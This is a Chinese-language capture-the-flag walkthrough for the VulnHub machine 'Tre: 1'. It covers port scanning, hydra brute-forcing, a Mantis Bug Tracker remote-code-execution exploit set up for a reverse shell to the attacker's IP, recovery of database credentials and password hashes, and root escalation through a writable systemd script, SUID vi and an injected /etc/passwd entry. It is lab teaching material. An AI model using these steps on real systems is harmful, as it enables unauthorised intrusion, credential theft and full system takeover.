靶机地址：[Tre: 1 ~ VulnHub](https://www.vulnhub.com/entry/tre-1,483/)
推荐：VMware
Walkthrough

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.58"
sudo nmap -p "22,80,8082" -sV "192.168.1.58"
# 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
# 8082/tcp open  http    nginx 1.14.2
```

先访问80和8082端口的web服务，都是图片，没啥特别的，但是通过源码发现，路径为 `file.jpg`
猜测可能是隐写的文件，试一下，果然是，但是需要密码，暴力破解也失败了
进行web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.58"
# /cms/
# /adminer.php
# /info.php
# /system
sudo dirsearch -u "http://192.168.1.58:8082"
```
对 `/system` 进行暴力破解
```Shell
hydra -L /home/kali/Tools/Custom/MidPwds.txt -P /home/kali/Tools/Custom/MidPwds.txt -f http-get://192.168.1.58/system
# admin admin
```
登陆后的页面是使用mantis开发的，找一下相关漏洞
```Shell
searchsploit mantis
# Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated) | php/webapps/48818.p
```
发现一个不需要登录就可以远程代码执行的漏洞，拷贝下来看看
需要进行修改
```Python
self.headers = {"Authorization":"Basic YWRtaW46YWRtaW4="}
self.RHOST = "192.168.1.58" # Victim IP
self.RPORT = "80" # Victim port
self.LHOST = "192.168.1.26" # Attacker IP
self.LPORT = "4444" # Attacker Port
self.mantisLoc = "/system" # Location of mantis in URL
```
成功获取到反弹shell，进一步信息收集
```Shell
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# tre:x:1000:1000:tre,,,:/home/tre:/bin/bash
```
尝试切换到用户 `tre`  进一步路径枚举
```Shell
sudo dirsearch -u "http://192.168.1.58/system" --header="Authorization: Basic YWRtaW46YWRtaW4="
# /system/config/
wget http://192.168.1.58/system/config/data.sql --header="Authorization: Basic YWRtaW46YWRtaW4="
```
其中包含账号密码
```
administrator
63a9f0ea7bb98050796b649e85481845    ( root )
```
其它文件
```Shell
wget http://192.168.1.58/system/config/a.txt --header="Authorization: Basic YWRtaW46YWRtaW4="
```
包含如下内容
```
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
```
尝试登录MySQL，或者通过 `/adminer.php` 登录
```Shell
mysql -u mantissuser -D mantis -p
# password@123AS
```
登录成功，`mantis_user_table` 中发现如下数据
```
username         realname         password
administrator    administrator    5f4dcc3b5aa765d61d8327deb882cf99    ( password )
tre              Tr3@123456A!     64c4685f8da5c2225de7890c1bad0d7f    (x)
```
最终发现 `Tr3@123456A!` 就是用户 `tre` 的密码
```Shell
ssh tre@192.168.1.58
# Tr3@123456A!
```
尝试提权
```Shell
sudo -l
# (ALL) NOPASSWD: /sbin/shutdown
find / -user root -type f -perm -o=w 2>/dev/null | grep -v "/proc/" | grep -v "/cgroup/" | grep -v "/kernel/"
# /usr/bin/check-system
cat /usr/bin/check-system
```
内容如下
```Shell
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done
```
查看程序执行情况
```Shell
grep -Ri "check-system" /etc 2>/dev/null
# /etc/systemd/system/check-system.service:ExecStart=/bin/bash /usr/bin/check-system
# /etc/systemd/system/multi-user.target.wants/check-system.service:ExecStart=/bin/bash /usr/bin/check-system
```
表示系统重启时会执行此脚本
`vi /usr/bin/check-system` 添加一行指令
```Shell
chmod +s /usr/bin/vi;
```
重启
```Shell
sudo /sbin/shutdown -r now
```
利用
```Shell
ls -l /usr/bin/vi
# lrwxrwxrwx 1 root root 20 May 11  2020 /usr/bin/vi -> /etc/alternatives/vi
ls -l /etc/alternatives/vi
# lrwxrwxrwx 1 root root 17 May 11  2020 /etc/alternatives/vi -> /usr/bin/vim.tiny
ls -l /usr/bin/vim.tiny
# -rwsr-sr-x 1 root root 1200696 Jun 15  2019 /usr/bin/vim.tiny
```
生成密码
```Shell
openssl passwd -1
# 密码: test
```
编辑密码文件  `/usr/bin/vim.tiny /etc/passwd` 添加如下内容
```
tset:$1$/P/jyYVK$ZI7LJu/J6kVDQQec/NwXO1:0:0:root:/root:/bin/bash
```
保存并退出
```
:wq!
```
切换用户
```Shell
su tset
# test
```
提权成功